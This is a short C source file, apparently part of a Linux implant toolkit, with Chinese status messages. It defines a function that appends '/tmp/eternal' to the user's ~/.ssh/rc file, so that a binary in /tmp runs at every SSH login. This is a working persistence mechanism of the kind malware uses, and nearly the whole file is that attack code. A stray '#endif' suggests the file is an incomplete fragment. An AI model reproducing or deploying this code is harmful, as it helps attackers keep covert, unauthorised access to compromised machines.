#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_sshrc.h"

void setup_user_sshrc_persistence() {
    printf("设置用户SSH RC持久化...\n");
    const char* home_path = getenv("HOME");
    if (home_path) {
        char user_ssh_rc_path[512];
        snprintf(user_ssh_rc_path, sizeof(user_ssh_rc_path), "%s/.ssh/rc", home_path);
        FILE *user_ssh_rc_file = fopen(user_ssh_rc_path, "a");
        if (user_ssh_rc_file) {
            fprintf(user_ssh_rc_file, "\n/tmp/eternal\n");
            fclose(user_ssh_rc_file);
            printf("持久化命令已添加到用户SSH RC。\n");
        } else {
            perror("无法打开用户的SSH RC文件");
        }
    } else {
        printf("无法获取HOME环境变量。\n");
    }
}
#endif
